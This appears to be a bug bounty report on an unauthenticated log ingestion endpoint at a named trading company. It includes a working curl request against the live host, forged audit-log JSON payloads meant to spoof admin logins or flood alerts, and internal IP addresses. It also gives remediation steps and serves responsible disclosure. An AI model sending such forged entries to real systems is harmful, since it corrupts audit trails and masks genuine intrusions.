# Finding #03 — Unauthenticated Log Injection on ClientLogsApi

**Program:** eToro Bug Bounty (Bugcrowd)  
**Date Found:** 2026-09-02  
**Severity:** P2 HIGH (CVSS 7.5)  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N  
**CWE:** CWE-306 (Missing Authentication for Critical Function) + CWE-117 (Improper Output Neutralization for Logs)

---

## Summary

The `etorologsapi.etoro.com` service exposes a log ingestion endpoint at `/api/v2/monitoring` that accepts arbitrary log events from any source without requiring authentication. An unauthenticated attacker can inject fabricated log entries into eToro's internal monitoring/telemetry system using any `ApplicationIdentifier` (including spoofed identifiers such as `trading-platform` or `admin-portal`), corrupting audit trails and potentially triggering false alerts or masking genuine security incidents.

---

## Affected Asset

- **Host:** `etorologsapi.etoro.com`
- **Endpoint:** `POST /api/v2/monitoring`
- **Technology:** Kestrel (.NET), Azure Application Insights (App ID: `fd70748c-8efd-4b7f-a0f0-36ea0c443ced`)
- **Scope:** `*.etoro.com` ✓

---

## Technical Details

### Endpoint Discovery

The endpoint URL was extracted from the minified Angular JavaScript bundle served at `https://por.etoro.com`:

**File:** `chunk-FJE3VJJW.js`
```javascript
xt = {
  version: "2.2.5",
  production: true,
  API: "https://affapi.etoro.com/api/",
  loggerApiUrl: "https://etorologsapi.etoro.com/api/v2/monitoring",
  loggerIdentifier: "partners-portal",
  // ...
}
```

The logger service implementation also revealed the exact request format:

```javascript
_send(n, e) {
  if (n && n.length) {
    let r = new XMLHttpRequest;
    r.open("POST", this.config.apiUrl);
    r.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
    r.setRequestHeader("ApplicationIdentifier", xt.loggerIdentifier);
    r.setRequestHeader("ApplicationVersion", xt.version);
    r.send(JSON.stringify({ LogEvents: n, MonitorEvents: e }));
  }
}
```

### Proof of Concept

The following request succeeds (HTTP 200) without any authentication:

```bash
curl -si \
  -X POST \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "ApplicationIdentifier: partners-portal" \
  -H "ApplicationVersion: 2.2.5" \
  -d '{"LogEvents":[{"level":"error","message":"bugbounty-verification","timestamp":"2026-09-02T08:00:00Z","categories":"test"}],"MonitorEvents":[]}' \
  "https://etorologsapi.etoro.com/api/v2/monitoring"
```

**Response:**
```
HTTP/2 200
content-length: 0
server: Kestrel
request-context: appId=cid-v1:fd70748c-8efd-4b7f-a0f0-36ea0c443ced
```

### Extent of the Vulnerability

All log severity levels are accepted without authentication:

| Log Level | HTTP Response |
|-----------|--------------|
| `info`    | 200 OK       |
| `warn`    | 200 OK       |
| `error`   | 200 OK       |
| `critical`| 200 OK       |
| `debug`   | 200 OK       |

Any `ApplicationIdentifier` is accepted — there is no validation against a whitelist:

| ApplicationIdentifier    | HTTP Response |
|--------------------------|--------------|
| `partners-portal`        | 200 OK       |
| `admin-portal`           | 200 OK       |
| `trading-platform`       | 200 OK       |
| `ARBITRARY_APP`          | 200 OK       |

---

## Attack Scenarios

### 1. Audit Trail Corruption

An attacker can inject log entries claiming to originate from sensitive systems (`trading-platform`, `admin-portal`, `compliance-service`) with fabricated content:

```json
{
  "LogEvents": [{
    "level": "info",
    "message": "Admin login successful for user admin@etoro.com from IP 1.2.3.4",
    "timestamp": "2026-09-02T03:00:00Z",
    "categories": "auth_audit"
  }],
  "MonitorEvents": []
}
```

This corrupts the audit trail with false entries that may be indistinguishable from legitimate logs.

### 2. Alert Flooding / Security Monitoring Bypass

An attacker launching a real attack can simultaneously flood the log system with thousands of high-severity error events from spoofed identifiers, generating enough noise to bury genuine incident indicators in the monitoring dashboard:

```json
{
  "LogEvents": [{
    "level": "critical",
    "message": "Database connection failure - expected in maintenance",
    "categories": "infrastructure"
  }],
  "MonitorEvents": []
}
```

### 3. False Incident Creation

If the log system triggers automated alerts or incident response workflows on certain log patterns (e.g., `level: "critical"` from `trading-platform`), an attacker can trigger false incident responses, wasting security team resources or causing unwarranted service actions.

### 4. Chaining with Finding #01

Combined with **Finding #01** (unauthenticated infrastructure disclosure), the attacker already knows:
- Internal pod IPs (`10.204.83.206`, `10.203.86.49`)
- Pod names, git commit hashes, deployment branches

These can be injected as log metadata to make fabricated entries appear legitimate.

---

## Evidence

### Request Used for Verification (Passive Observation Only)
```
POST https://etorologsapi.etoro.com/api/v2/monitoring HTTP/2
Content-Type: text/plain;charset=UTF-8
ApplicationIdentifier: partners-portal
ApplicationVersion: 2.2.5
X-Bug-Bounty: komeng rooket

{"LogEvents":[{"level":"info","message":"test","timestamp":"2026-09-02T08:00:00Z"}],"MonitorEvents":[]}
```

```
HTTP/2 200
content-length: 0
server: Kestrel
request-context: appId=cid-v1:fd70748c-8efd-4b7f-a0f0-36ea0c443ced
```

**No logs were injected beyond the minimal verification requests. The Bug Bounty identifier `komeng rooket` was included on all requests.**

---

## Root Cause

The `ClientLogsApi` service (`etorologsapi.etoro.com`) implements no authentication or authorization on the log ingestion endpoint. The intended design is that the Angular SPA sends logs from the browser using a non-intercepted XMLHttpRequest (without the MSAL Bearer token), as evidenced by the use of raw `XMLHttpRequest` rather than Angular's `HttpClient` (which would add auth headers via the MSAL interceptor). This design decision — intentional for performance — was not paired with any alternative validation mechanism such as:

- A per-application pre-shared API key
- IP allowlisting
- Request signature verification
- Rate limiting per source IP

---

## Remediation

1. **Require API key authentication**: Issue a per-application secret key embedded at build time. Rotate per release. Validate on every ingest request.

2. **Validate `ApplicationIdentifier` against a whitelist**: Reject requests from unknown identifiers.

3. **Use Azure Monitor Ingestion API with Azure AD**: The recommended pattern for sending custom logs to Azure Monitor/App Insights from a web client is via a backend proxy that authenticates with Azure AD before forwarding.

4. **Rate limit per IP**: Even without authentication, limit ingestion requests to prevent bulk injection/flooding.

5. **Log source verification**: Correlate injected logs against expected client IPs/sessions to flag anomalous sources.

---

## References

- CWE-306: Missing Authentication for Critical Function
- CWE-117: Improper Output Neutralization for Logs (Log Injection)
- OWASP: Logging Cheat Sheet
- Azure Application Insights: Authenticated Log Ingestion
